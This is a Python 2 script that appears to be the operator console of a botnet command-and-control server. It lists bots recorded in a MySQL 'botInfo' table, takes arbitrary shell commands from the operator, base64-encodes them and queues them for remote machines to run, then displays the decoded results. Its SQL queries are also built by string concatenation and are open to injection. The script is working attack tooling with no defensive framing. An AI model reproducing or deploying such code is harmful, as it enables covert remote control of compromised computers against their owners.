#!/usr/bin/python

import MySQLdb
import sys
import base64
import ConfigParser

def sendCommand(mID, osT, c, db):
	print
	print "Send the following command to machineID: " + mID
	selection = raw_input("$ ")
	encodedSelection = base64.b64encode(selection)
	if len(selection) > 1:
		sql = "INSERT INTO botInfo (machineID, osType, httpCommand, executed) VALUES ('" + mID + "','" + osT + "','" + encodedSelection + "','N')"
		c.execute(sql)
		db.commit()
	main()

def controlBot(botID, cur, db):
	while True:
		sql = "SELECT machineID, osType, httpCommand, httpResults, executed FROM botInfo WHERE id=" + botID
		cur.execute(sql)
		db.commit()
		if (cur.rowcount > 0):
			for row in cur.fetchall():
				id = botID
				machineID = row[0]
				osType = row[1]
				httpCommand = base64.b64decode(row[2])
				encodedResults = row[3]
				if encodedResults:
					httpResults = base64.b64decode(encodedResults)
				else:
					httpResults = "Pending..."
				executed = row[3]
				print
				print "BotID: " + id + " MachineID: " + machineID
				print "Command: " + httpCommand
				print 
				print "Results:"
				print httpResults
				print
			print "I. Issue Command to Bot"
			print "R. Refresh"
			print "Q. Return to Main"
			selection = raw_input(id+"$ ")
			if (selection == 'I') | (selection == 'i'):
				sendCommand(machineID, osType, cur, db)
			elif (selection == 'Q') | (selection == 'q'):
				main()
			else:
				continue
		else:
			print "Invalid numerical selection."
			break


def main():
	config = ConfigParser.ConfigParser()
	config.read("config.ini")
	myHost = config.get('Database', 'dbHost')
	myUser = config.get('Database', 'dbUser')
	myPass = config.get('Database', 'dbPass')
	myDB = config.get('Database', 'dbName')
	db = MySQLdb.connect(host=myHost, user=myUser, passwd=myPass, db=myDB)
	cursor = db.cursor()
	while True:
		print 
		print "Select the number preceding the botID or the following options:"
		sql = "SELECT id, machineID, httpCommand, executed FROM botInfo"
		cursor.execute(sql)
		db.commit()
		if (cursor.rowcount > 0):
			for row in cursor.fetchall():
				id = row[0]
				machineID = row[1]
				httpCommand = base64.b64decode(row[2])
				executed = row[3]
				if executed == 'Y':
					httpResultsExist="Y"
				else:
					httpResultsExist="N"
				print str(id) + ". BotID:" + machineID + " Command:" + httpCommand + " Results Exist:" + httpResultsExist
		print
		print "R. Refresh"
		print "Q. Quit"
		selection = raw_input("$ ")
		if (selection == 'Q') | (selection == 'q'):
			sys.exit(0)
		elif (selection == 'R') | (selection == 'r'):
			continue
		else:
			controlBot(selection, cursor, db)
	cursor.close()
	del cursor
	db.close()

if __name__ == "__main__":
        main()

